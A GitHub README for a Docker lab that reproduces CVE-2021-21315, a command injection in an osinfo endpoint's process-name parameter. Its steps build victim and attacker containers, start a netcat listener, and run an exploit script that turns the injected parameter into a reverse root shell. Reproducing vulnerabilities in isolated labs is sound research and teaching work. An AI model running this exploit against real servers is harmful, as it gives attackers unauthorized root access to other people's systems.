# CVE-2021-21315
This is a fork repo adding in more complete documentation as well as an 'attacker' container to exploit CVE. Everything is done using pure docker (not docker-compose) inside a docker network to facilitate communication. Follow the instructions below.

### Running
**1. Clone the repo.**

``` sh
git clone https://github.com/timothy1205/CVE-2021-21315`
```


**2. Build our victim and attacker images called `victim-image` and `attacker-image` respectively.**

```sh
docker build -t victim-image ./victim
docker build -t attacker-image ./attacker
```

**3. Create our docker network to allow the containers to communicate.**

We will use subnet `172.10.10.0/24` on our network called `exploit-network for this example.

``` sh
docker network create --subnet 172.10.10.0/24 exploit-network
```


**4. Create our docker containers on our network.**

Our attacker will be assigned a static ip`172.10.10.2` and our victim `172.10.10.3`.

``` sh
docker run --net exploit-network --ip 172.10.10.2 --name attacker -d attacker-image
docker run --net exploit-network --ip 172.10.10.3 --name victim -d victim-image
```

**5. Run the exploit.**

You will want to have two separate shells open. One for running netcat and one for running the exploit.

Shell 1: Launch netcat on port `4444`
``` sh
# Shell 1
docker exec -it attacker bash
nc -nlvp 4444
```

Shell 2: Run the exploit.
* `-u http://172.10.10.3:3000/api/osinfo?param` is the endpoint our victim is listening on. `param` represents the parameter holding the expected process name, but will instead be used for our payload. 
* `--lport 4444` is our netcat port on our attacker container.
* `--lhost 172.10.10.2` is our attacker container's ip.

``` sh
# Shell 2
docker exec -w /root -it attacker bash
python3 exploit.py -u http://172.10.10.3:3000/api/osinfo?param --lport 4444 --lhost 172.10.10.2
```
**6. Done**

You should notice your shell running netcat turned to a bash shell. Running a quick `ls` will reveal that you have access to the files for the node server. You will also notice you are root (the user that runs the node server within the container) and have full access to the system (container).

**7. Cleanup**

Run these commands to remove all the created docker assets.

``` sh
docker rm victim -f
docker rm attacker -f
docker image rm victim-image -f
docker image rm attacker-image -f
docker network rm exploit-network
```
